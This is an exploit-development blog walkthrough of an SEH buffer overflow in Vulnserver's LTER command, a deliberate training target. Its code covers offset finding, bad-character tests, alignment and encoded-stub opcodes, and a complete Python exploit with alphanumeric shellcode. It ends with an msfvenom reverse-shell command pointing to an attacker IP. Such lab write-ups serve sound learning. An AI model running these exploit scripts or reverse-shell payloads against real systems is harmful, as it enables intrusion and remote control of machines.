---
layout: post
title: Vulnserver LTER - SEH Extremely restricted character set
date: 2020-03-08 18:00:00
categories: posts
comments: false
en: true
---

# Introduction

### Last time i blogged, we tackled aligning registers within windows exploit development. Today we will be seeing an example on the [vulnerable server by stephen bradshaw](https://github.com/stephenbradshaw/vulnserver/), in which, a restricted set of characters may be found. Furthermore, due to lack of executable space when leading the flow, it will be required to use additional techniques to successfully exploit the server.

### The basics once again

##### As with any other vulnerable applicaiton to a buffer overflow, we need to test it first in order to exploit it, as in the [previous](https://whitecr0wz.github.io/posts/Exploiting-Stack-Overflows-On-Windows/) walkthrough in vulnserver, the parameter was vulnerable to the use of /.:/ after it being called, let's test if this works as well with LTER.

###### PoC code:

```term
import socket, sys, struct

buffer = "LTER /.:/" + "A" * 5000

host = sys.argv[1]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, 9999))

s.send(buffer)

s.close()
```

###### Response of the SEH Chain

![](/assets/img/LTER/1.png)

##### As with any other buffer overflow, the next step is to use a pattern in order to find the offset through the cyclic pattern.

```term
root@whitecr0wz:~/Exploit-Dev/LTER# msf-pattern_create -l 5000 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab . . .
```

###### Response of the SEH Chain

![](/assets/img/LTER/2.png)

##### With the value 0x326E4531, the offset is found.

```term
root@whitecr0wz:~/Exploit-Dev/LTER# msf-pattern_offset -q 326E4531 
[*] Exact match at offset 3515
root@whitecr0wz:~/Exploit-Dev/LTER# 
```

##### Due to the fact that now we know the offset, we can check if the control of the nseh & seh register was obtained.

###### PoC code:

```term
import socket, sys, struct

buffer = "LTER /.:/" + "A" * 3515 + "BBBB" + "CCCC" + "\xff" * 200

host = sys.argv[1]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, 9999))

s.send(buffer)

s.close()
```
###### Response of the SEH Chain

![](/assets/img/LTER/3.png)

## Where the fun begins!

##### Let's check for any bad characters that may hurt our shellcode, shall we?

###### List of bad characters

```term
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
```

##### In order to analyze it, the bad characters shall be sent after the 4 bytes of C's.

###### PoC code:

```term
import socket, sys, struct

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buffer = "LTER /.:/" + "A" * 3515 + "BBBB" + "CCCC" + badchars + "\xff" * 200

host = sys.argv[1]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, 9999))

s.send(buffer)

s.close()
```

##### Checking the stack, we see an interesting response.

![](/assets/img/LTER/4.png)

##### This behaviour could determine that the amount of bytes given to execute once the flow is obtained is very limited to our needs. This may be an issue later on, but for now, we'll simply switch the bad characters from the end of the buffer to the middle and see if that processes all of them!

###### PoC code:

```term
import socket, sys, struct

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buffer = "LTER /.:/" + "A" * 2500 + badchars + "A" * (3515 - 2500 - len(badchars)) + "BBBB" + "CCCC" + "\xff" * 200

host = sys.argv[1]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, 9999))

s.send(buffer)

s.close()
```

##### Checking the stack, we see an interesting response.

![](/assets/img/LTER/5.png)

##### Interesting, it seems as after character 80, no other byte will be parsed as desired. 

#### Controlling the flow.

##### As in any other SEH Based exploit, we require a PPR address, along with an jump, and, due to the fact that bytes such as EB and 90 are discarded, it must be ascii, such as a JO/JNO for example.

###### Listing all modules

![](/assets/img/LTER/6.png)

##### It seems as essfunc.dll may help once again.

###### Listing all PPR addresses within essfunc.dll.

![](/assets/img/LTER/7.png)

##### Nice! Now we can select the second or third address to use in order to overwrite the SEH value, as these are ascii printable.

###### PoC code:

```term
import socket, sys, struct

nseh = struct.pack("<I", 0x06710870)
seh = struct.pack("<I", 0x6250195E)

buffer = "LTER /.:/" + "A" * 3515 + nseh + seh + "C" * 200

host = sys.argv[1]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, 9999))

s.send(buffer)

s.close()
```

###### Response of the SEH Chain.

![](/assets/img/LTER/8.png)

##### If this is run, it will display a black screen, as 200 C's are more than the server is able to handle. Due to this, we just grab a pointer address and scroll down, just to find our executed code.

![](/assets/img/LTER/9.png)

### Time to play games.

##### We have executed code! What now? We are not able to simply shove down an encoded msfvenom shell or aligning it nor calling it! Due to space issues and char restriction we find ourselves on a tricky scenario.

##### In order to exploit this server, i came up with the following thinking:

+ Inserting my purely alphanumeric payload using ESI way back at the beginning of the buffer.
+ Aligning ESI to such.
+ Use a PUSH ESI, follwed by a RET.

##### This method sounds beautiful, doesn't it? The main issue here is that the instruction RET has an opcode of C3, which means that it may not be parsed as we would like to, neither we can encode this opcode, as we don't have enough space for that. To fix this, i decided to pursue the method of SUB/ADD encoding, in which a series of opcodes are encoded and then decoded if the ESP pointer is pointing at a lower address than this encoded instructions, i over simplified how this method works, but it is enough to know what it does. 

##### The order of these alignments would be the following:

+ The value of ESP is inserted into EAX in order to perform calculations, and in EBX, just as a backup when it is time to execute the shellcode, as if the ESP has a similar address, it may execute your shellcode, but it will definitely crash the execution!

+ It will be added to ax as much as needed in order to reach near the end of the buffer.

+ This value is popped into ESP.

+ The value of EBX is pushed into the stack and then popped into EAX in order to make calculations take less bytes.

+ EAX is aligned into the pure alphanumeric shellcode.

+ This value is popped into ESI.

+ The SUB/ADD encoded series of 4 instructed will be sent: PUSH EBX, POP ESP; PUSH ESI, RET. This will push the value of EBX into the stack and pop it into ESP, and after that pushing ESI into the stack and then return the address through RET. 

##### Getting the opcodes for PUSH ESP, POP EAX; PUSH ESP, POP EBX. Also, i made sure to no longer use C's as their instruction is INC EBX, this would mean that the value of EBX would be constantly incremented, something we do not want, right?

```term
root@whitecr0wz:~# msf-nasm_shell 
nasm > PUSH ESP
P00000000  54                push esp
nasm > POP EAX
00000000  58                pop eax
nasm > PUSH ESP
00000000  54                push esp
nasm > POP EBX
00000000  5B                pop ebx
nasm > 
```

###### PoC code:

```term
import socket, sys, struct

alignment = ""
alignment += "\x54\x58\x54\x5B"

nseh = struct.pack("<I", 0x06710870)
seh = struct.pack("<I", 0x6250195E)

buffer = "LTER /.:/" + "A" * 3515 + nseh + seh + "A" * 2 + alignment + "A" * 200

host = sys.argv[1]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, 9999))

s.send(buffer)

s.close()
```

##### Once the alignment is executed, it can be seen how EAX has the same value as ESP.

![](/assets/img/LTER/10.png)

##### The next step, is to turn the value of EAX near the end of the stack. The address i chose to perform the calculations is 0x017BFFFC.

![](/assets/img/LTER/11.png)

##### The next step, is to calculate the difference between 0x017BFFFC and 0x017BECA4, which can be easily done with the following program.

```term
#!/bin/bash

printf "0x%X\n" $(($1 - $2))
```

```term
root@whitecr0wz:~/Exploit-Dev/LTER# hexcalc 0x017BFFFC 0x017BECA4 
0x1358
root@whitecr0wz:~/Exploit-Dev/LTER# 
```

##### As given, 0x1358 is the value needed to add to 0x017BECA4 in order to become 0x017BFFFC.

##### The opcodes for such operation are found in msf-nasm_shell.

```term
nasm > add ax, 0x1358
00000000  66055813          add ax,0x1358
nasm > 
```

##### The next step is to find the opcodes of PUSH EAX, POP ESP, this is done once again in msf-nasm_shell.

```term
nasm > PUSH ESP
00000000  54                push esp
nasm > POP EBX
00000000  5B                pop ebx
nasm > 
```

###### PoC code:

```term
import socket, sys, struct

alignment = ""
alignment += "\x54\x58\x54\x5B"
alignment += "\x66\x05\x58\x13"
alignment += "\x50\x5C"

nseh = struct.pack("<I", 0x06710870)
seh = struct.pack("<I", 0x6250195E)

buffer = "LTER /.:/" + "A" * 3515 + nseh + seh + "A" * 2 + alignment + "A" * 200

host = sys.argv[1]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, 9999))

s.send(buffer)

s.close()
```

##### The alignment seems to have done its work as intended.

![](/assets/img/LTER/12.png)

##### The next step is pointing ESI to the shellcode, to do this, alphanumeric shellcode using the ESI register is generated, and the value of EBX is pushed into the stack and popped into EAX, in order to make the calculations smaller.

```term
root@whitecr0wz:~/Exploit-Dev/LTER# msfvenom -p windows/exec CMD=calc.exe -f py -e x86/alpha_mixed BufferRegister=ESI EXITFUNC=thread 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 440 (iteration=0)
x86/alpha_mixed chosen with final size 440
Payload size: 440 bytes
Final size of py file: 2145 bytes
buf =  b""
buf += b"\x56\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += b"\x49\x6c\x38\x68\x6c\x42\x37\x70\x43\x30\x33\x30\x63"
buf += b"\x50\x4f\x79\x48\x65\x75\x61\x4f\x30\x31\x74\x6e\x6b"
buf += b"\x36\x30\x76\x50\x6c\x4b\x31\x42\x54\x4c\x6c\x4b\x62"
buf += b"\x72\x64\x54\x4e\x6b\x54\x32\x37\x58\x44\x4f\x6e\x57"
buf += b"\x73\x7a\x47\x56\x70\x31\x79\x6f\x6e\x4c\x55\x6c\x71"
buf += b"\x71\x73\x4c\x75\x52\x44\x6c\x65\x70\x6f\x31\x48\x4f"
buf += b"\x54\x4d\x33\x31\x6a\x67\x49\x72\x39\x62\x30\x52\x31"
buf += b"\x47\x6e\x6b\x76\x32\x36\x70\x4c\x4b\x73\x7a\x77\x4c"
buf += b"\x6e\x6b\x30\x4c\x77\x61\x30\x78\x4a\x43\x43\x78\x37"
buf += b"\x71\x78\x51\x66\x31\x6c\x4b\x42\x79\x31\x30\x45\x51"
buf += b"\x5a\x73\x4c\x4b\x70\x49\x66\x78\x6b\x53\x46\x5a\x31"
buf += b"\x59\x6c\x4b\x56\x54\x4e\x6b\x35\x51\x79\x46\x64\x71"
buf += b"\x4b\x4f\x6e\x4c\x7a\x61\x5a\x6f\x46\x6d\x56\x61\x78"
buf += b"\x47\x67\x48\x49\x70\x73\x45\x4a\x56\x44\x43\x73\x4d"
buf += b"\x7a\x58\x77\x4b\x43\x4d\x65\x74\x31\x65\x68\x64\x72"
buf += b"\x78\x6c\x4b\x31\x48\x34\x64\x73\x31\x5a\x73\x75\x36"
buf += b"\x4c\x4b\x76\x6c\x50\x4b\x6e\x6b\x76\x38\x77\x6c\x76"
buf += b"\x61\x5a\x73\x6c\x4b\x74\x44\x4e\x6b\x35\x51\x6a\x70"
buf += b"\x4c\x49\x37\x34\x47\x54\x64\x64\x43\x6b\x51\x4b\x65"
buf += b"\x31\x76\x39\x70\x5a\x33\x61\x49\x6f\x4d\x30\x53\x6f"
buf += b"\x33\x6f\x43\x6a\x6c\x4b\x65\x42\x48\x6b\x4c\x4d\x71"
buf += b"\x4d\x31\x7a\x75\x51\x6e\x6d\x6b\x35\x48\x32\x63\x30"
buf += b"\x67\x70\x33\x30\x30\x50\x55\x38\x45\x61\x6e\x6b\x52"
buf += b"\x4f\x6f\x77\x4b\x4f\x4e\x35\x6f\x4b\x6d\x30\x47\x6d"
buf += b"\x44\x6a\x66\x6a\x31\x78\x4c\x66\x4e\x75\x4f\x4d\x6f"
buf += b"\x6d\x4b\x4f\x68\x55\x67\x4c\x33\x36\x71\x6c\x77\x7a"
buf += b"\x6b\x30\x69\x6b\x59\x70\x30\x75\x73\x35\x4d\x6b\x72"
buf += b"\x67\x57\x63\x53\x42\x52\x4f\x63\x5a\x53\x30\x36\x33"
buf += b"\x59\x6f\x58\x55\x53\x53\x70\x61\x42\x4c\x70\x63\x46"
buf += b"\x4e\x72\x45\x32\x58\x65\x35\x53\x30\x41\x41"
```

```term
nasm > PUSH EBX
00000000  53                push ebx
nasm > POP EAX
00000000  58                pop eax 
```

###### PoC code:

```term
import socket, sys, struct

[shellcode]

alignment = ""
alignment += "\x54\x58\x54\x5B"
alignment += "\x66\x05\x58\x13"
alignment += "\x50\x5C"
alignment += "\x53\x58"

nseh = struct.pack("<I", 0x06710870)
seh = struct.pack("<I", 0x6250195E)

buffer = "LTER /.:/" + "A" * 3 + buf + "A" * (3515  - 3 - len(buf)) + nseh + seh + "A" * 2 + alignment + "A" * 200

host = sys.argv[1]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, 9999))

s.send(buffer)

s.close()
```

##### Once this is sent, it can be seen near the start of our buffer.

![](/assets/img/LTER/13.png)

##### The following step is to make EAX point to the shellcode, so it can be inserted in ESI later on.

##### Calculating the address of the start of the shellcode against the value of EAX.

```term
root@whitecr0wz:~/Exploit-Dev/LTER# hexcalc 0x0185F20C 0x0185ECA4 
0x568
root@whitecr0wz:~/Exploit-Dev/LTER# 
```

##### Getting the values for the calculation.

```term
nasm > add ax, 0x568  
00000000  66056805          add ax,0x568
nasm > 
```

##### The opcodes required for PUSH EAX, POP ESI.

```term
nasm > PUSH EAX 
00000000  50                push eax
nasm > POP ESI
00000000  5E                pop esi 
```

###### PoC code:

```term
import socket, sys, struct

[shellcode]

alignment = ""
alignment += "\x54\x58\x54\x5B"
alignment += "\x66\x05\x58\x13"
alignment += "\x50\x5C"
alignment += "\x53\x58"
alignment += "\x66\x05\x68\x05"
alignment += "\x50\x5E"

nseh = struct.pack("<I", 0x06710870)
seh = struct.pack("<I", 0x6250195E)

buffer = "LTER /.:/" + "A" * 3 + buf + "A" * (3515  - 3 - len(buf)) + nseh + seh + "A" * 2 + alignment + "A" * 200

host = sys.argv[1]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, 9999))

s.send(buffer)

s.close()
```

##### ESI is now pointing into the shellcode!

![](/assets/img/LTER/14.png)

##### As we may see on the following image, we still have some space to insert our SUB/ADD encoded PUSH EBX, POP ESP, PUSH ESI, RET.

![](/assets/img/LTER/15.png)

##### Getting the opcodes for such operation

```term
nasm > PUSH EBX
00000000  53                push ebx
nasm > POP ESP 
00000000  5C                pop esp
nasm > PUSH ESI 
00000000  56                push esi
nasm > RET
00000000  C3                ret 
```

##### For encoding these opcodes through this method, i will use [slink](https://github.com/ihack4falafel/Slink) from [ihack4falafel](https://github.com/ihack4falafel).

```term
root@whitecr0wz:~/Exploit-Dev/LTER# slink
Enter your shellcode: \x53\x5C\x56\xC3
Enter shellcode variable name: pushesi
[+] Shellcode size is divisible by 4
[*] Encoding [c3565c53]..
[+] No bad character found, using default encoder..
pushesi += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
pushesi += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
pushesi += "\x05\x32\x36\x33\x62" ## add  eax, 0x62333632
pushesi += "\x05\x21\x26\x23\x61" ## add  eax, 0x61232621
pushesi += "\x50"                 ## push eax
[*] Shellcode final size: 21 bytes
root@whitecr0wz:~/Exploit-Dev/LTER# 
```

##### Final PoC:

```term
import socket, sys, struct

# msfvenom -p windows/exec CMD=calc.exe -f py -e x86/alpha_mixed BufferRegister=ESI EXITFUNC=thread
# Payload size: 440 bytes

buf =  b""
buf += b"\x56\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += b"\x49\x6c\x38\x68\x6c\x42\x37\x70\x43\x30\x33\x30\x63"
buf += b"\x50\x4f\x79\x48\x65\x75\x61\x4f\x30\x31\x74\x6e\x6b"
buf += b"\x36\x30\x76\x50\x6c\x4b\x31\x42\x54\x4c\x6c\x4b\x62"
buf += b"\x72\x64\x54\x4e\x6b\x54\x32\x37\x58\x44\x4f\x6e\x57"
buf += b"\x73\x7a\x47\x56\x70\x31\x79\x6f\x6e\x4c\x55\x6c\x71"
buf += b"\x71\x73\x4c\x75\x52\x44\x6c\x65\x70\x6f\x31\x48\x4f"
buf += b"\x54\x4d\x33\x31\x6a\x67\x49\x72\x39\x62\x30\x52\x31"
buf += b"\x47\x6e\x6b\x76\x32\x36\x70\x4c\x4b\x73\x7a\x77\x4c"
buf += b"\x6e\x6b\x30\x4c\x77\x61\x30\x78\x4a\x43\x43\x78\x37"
buf += b"\x71\x78\x51\x66\x31\x6c\x4b\x42\x79\x31\x30\x45\x51"
buf += b"\x5a\x73\x4c\x4b\x70\x49\x66\x78\x6b\x53\x46\x5a\x31"
buf += b"\x59\x6c\x4b\x56\x54\x4e\x6b\x35\x51\x79\x46\x64\x71"
buf += b"\x4b\x4f\x6e\x4c\x7a\x61\x5a\x6f\x46\x6d\x56\x61\x78"
buf += b"\x47\x67\x48\x49\x70\x73\x45\x4a\x56\x44\x43\x73\x4d"
buf += b"\x7a\x58\x77\x4b\x43\x4d\x65\x74\x31\x65\x68\x64\x72"
buf += b"\x78\x6c\x4b\x31\x48\x34\x64\x73\x31\x5a\x73\x75\x36"
buf += b"\x4c\x4b\x76\x6c\x50\x4b\x6e\x6b\x76\x38\x77\x6c\x76"
buf += b"\x61\x5a\x73\x6c\x4b\x74\x44\x4e\x6b\x35\x51\x6a\x70"
buf += b"\x4c\x49\x37\x34\x47\x54\x64\x64\x43\x6b\x51\x4b\x65"
buf += b"\x31\x76\x39\x70\x5a\x33\x61\x49\x6f\x4d\x30\x53\x6f"
buf += b"\x33\x6f\x43\x6a\x6c\x4b\x65\x42\x48\x6b\x4c\x4d\x71"
buf += b"\x4d\x31\x7a\x75\x51\x6e\x6d\x6b\x35\x48\x32\x63\x30"
buf += b"\x67\x70\x33\x30\x30\x50\x55\x38\x45\x61\x6e\x6b\x52"
buf += b"\x4f\x6f\x77\x4b\x4f\x4e\x35\x6f\x4b\x6d\x30\x47\x6d"
buf += b"\x44\x6a\x66\x6a\x31\x78\x4c\x66\x4e\x75\x4f\x4d\x6f"
buf += b"\x6d\x4b\x4f\x68\x55\x67\x4c\x33\x36\x71\x6c\x77\x7a"
buf += b"\x6b\x30\x69\x6b\x59\x70\x30\x75\x73\x35\x4d\x6b\x72"
buf += b"\x67\x57\x63\x53\x42\x52\x4f\x63\x5a\x53\x30\x36\x33"
buf += b"\x59\x6f\x58\x55\x53\x53\x70\x61\x42\x4c\x70\x63\x46"
buf += b"\x4e\x72\x45\x32\x58\x65\x35\x53\x30\x41\x41"

alignment = ""
alignment += "\x54\x58\x54\x5B"
alignment += "\x66\x05\x58\x13"
alignment += "\x50\x5C"
alignment += "\x53\x58"
alignment += "\x66\x05\x68\x05"
alignment += "\x50\x5E"

# root@whitecr0wz:~/Exploit-Dev/LTER# slink
# Enter your shellcode: \x53\x5C\x56\xC3
# Enter shellcode variable name: pushesi
# [+] Shellcode size is divisible by 4
# [*] Encoding [c3565c53]..
# [+] No bad character found, using default encoder..
# [*] Shellcode final size: 21 bytes

pushesi = ""
pushesi += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
pushesi += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
pushesi += "\x05\x32\x36\x33\x62" ## add  eax, 0x62333632
pushesi += "\x05\x21\x26\x23\x61" ## add  eax, 0x61232621
pushesi += "\x50"                 ## push eax

nseh = struct.pack("<I", 0x06710870)
seh = struct.pack("<I", 0x6250195E)

buffer = "LTER /.:/" + "A" * 3 + buf + "A" * (3515 - 3 - len(buf)) + nseh + seh + "A" * 2 + alignment + pushesi + "A" * 200

host = sys.argv[1]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, 9999))

s.send(buffer)

s.close()
```

##### If we add some breakpoints at the end of the SUB/ADD instructions, we may see how to instructions get decoded as we step through!

![](/assets/img/LTER/16.png)

![](/assets/img/LTER/17.png)

![](/assets/img/LTER/18.png)

##### EBX gets pushed into the stack and is popped into ESP.

![](/assets/img/LTER/19.png)

##### ESI is finally pushed into the stack and then returned, leading the flow to our shellcode.

![](/assets/img/LTER/20.png)

##### It is only left for us to run the program and execute the shellcode!

![](/assets/img/LTER/21.png)

##### This was fun, but as we have a lot of space due to the location of our shellcode, we can easily just swap it into a reverse shell.

##### Command used for generating the shellcode.

```term
root@whitecr0wz:~/Exploit-Dev/LTER# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.139 LPORT=9000 -f py -e x86/alpha_mixed BufferRegister=ESI EXITFUNC=thread 
```

##### After running it, the reverse-shell was achieved.

![](/assets/img/LTER/22.png)

##### If you wish to see the full exploit, you can have it [here](/assets/img/LTER/LTER.txt)

##### Thanks for reading the post! Until next time!
